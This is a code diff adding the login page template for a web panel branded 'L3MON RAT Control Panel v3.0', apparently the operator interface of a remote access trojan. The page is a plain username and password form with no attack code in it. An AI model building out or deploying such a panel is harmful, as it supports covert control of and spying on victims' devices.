@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html class="dark">
+<% include partials/head.ejs %>
+<body class="bg-bg-dark min-h-screen flex items-center justify-center">
+    <!-- Animated background -->
+    <div class="fixed inset-0 overflow-hidden pointer-events-none">
+        <div class="absolute top-1/4 left-1/4 w-96 h-96 bg-accent-blue/5 rounded-full blur-3xl"></div>
+        <div class="absolute bottom-1/4 right-1/4 w-96 h-96 bg-accent-purple/5 rounded-full blur-3xl"></div>
+    </div>
+
+    <!-- Login card -->
+    <div class="relative z-10 w-full max-w-md px-4">
+        <div class="glass-bright rounded-2xl p-8 shadow-2xl shadow-accent-blue/10">
+            <!-- Logo -->
+            <div class="text-center mb-8">
+                <div class="w-16 h-16 bg-gradient-to-br from-accent-amber to-accent-red rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-lg shadow-accent-amber/30">
+                    <span class="text-white font-bold text-2xl">L</span>
+                </div>
+                <h1 class="text-white text-xl font-bold">L3MON RAT</h1>
+                <p class="text-slate-500 text-sm mt-1">Control Panel v3.0</p>
+            </div>
+
+            <!-- Form -->
+            <form method="POST" action="/login" class="space-y-5">
+                <div>
+                    <label class="block text-slate-400 text-sm mb-1.5">Username</label>
+                    <div class="relative">
+                        <span class="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500">
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg>
+                        </span>
+                        <input type="text" name="username" placeholder="Enter username" required
+                            class="w-full pl-10 pr-4 py-2.5 bg-bg-card border border-slate-700 rounded-lg text-slate-200 focus:border-accent-blue focus:ring-1 focus:ring-accent-blue outline-none transition-all">
+                    </div>
+                </div>
+                <div>
+                    <label class="block text-slate-400 text-sm mb-1.5">Password</label>
+                    <div class="relative">
+                        <span class="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500">
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
+                        </span>
+                        <input type="password" name="password" placeholder="Enter password" required
+                            class="w-full pl-10 pr-4 py-2.5 bg-bg-card border border-slate-700 rounded-lg text-slate-200 focus:border-accent-blue focus:ring-1 focus:ring-accent-blue outline-none transition-all">
+                    </div>
+                </div>
+                <button type="submit" class="w-full py-2.5 bg-accent-blue hover:bg-blue-600 text-white font-semibold rounded-lg transition-all shadow-lg shadow-accent-blue/20">
+                    Login
+                </button>
+                <% if (typeof error !== 'undefined' && error) { %>
+                <div class="bg-accent-red/10 border border-accent-red/30 rounded-lg p-3 text-accent-red text-sm text-center">
+                    Invalid username or password
+                </div>
+                <% } %>
+            </form>
+        </div>
+        <p class="text-center text-slate-700 text-xs mt-6">L3MON v3.0 &mdash; Edited by <strong>xTheDevilRazedMe</strong></p>
+    </div>
+</body>
+</html>
